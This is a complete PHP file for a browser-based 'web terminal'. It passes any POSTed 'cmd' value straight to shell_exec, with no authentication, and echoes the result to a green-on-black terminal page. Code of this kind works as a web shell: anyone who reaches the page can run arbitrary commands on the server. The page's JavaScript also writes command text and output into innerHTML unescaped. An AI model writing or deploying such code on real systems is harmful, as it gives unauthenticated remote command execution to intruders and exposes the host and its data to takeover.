<?php
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo htmlspecialchars($output);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Terminal</title>
    <style>
        body { background: #1e1e1e; color: #00ff00; font-family: monospace; }
        #terminal { padding: 20px; }
        #output { white-space: pre-wrap; margin-bottom: 10px; }
        #cmd { background: transparent; border: none; color: #00ff00; outline: none; width: 80%; font-family: monospace; }
        .prompt { color: #ffff00; }
    </style>
</head>
<body>
    <div id="terminal">
        <div class="prompt">Web Terminal Ready</div>
        <div id="output"></div>
        <form id="cmdForm">
            <span class="prompt">$ </span>
            <input type="text" id="cmd" name="cmd" autocomplete="off" autofocus>
        </form>
    </div>

    <script>
        document.getElementById('cmdForm').onsubmit = function(e) {
            e.preventDefault();
            var cmd = document.getElementById('cmd').value;
            var output = document.getElementById('output');
            
            output.innerHTML += '<div class="prompt">$ ' + cmd + '</div>';
            
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'cmd=' + encodeURIComponent(cmd)
            })
            .then(response => response.text())
            .then(data => {
                output.innerHTML += '<div>' + data + '</div>';
                document.getElementById('cmd').value = '';
                window.scrollTo(0, document.body.scrollHeight);
            });
        };
    </script>
</body>
</html>
